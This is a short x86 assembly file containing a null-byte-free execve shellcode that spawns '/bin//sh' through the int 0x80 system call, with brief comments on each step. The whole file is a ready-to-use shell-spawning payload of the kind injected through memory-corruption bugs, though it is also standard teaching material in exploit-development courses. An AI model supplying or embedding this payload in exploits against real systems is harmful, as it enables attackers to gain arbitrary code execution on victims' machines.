global _start
section .text
_start:
xor eax, eax
; make path null terminated
push ax
; execve(path, args, env)
mov al, 0xb
push '//sh'
push '/bin'
lea ebx, [esp]
xor ecx, ecx
xor edx, edx
int 0x80
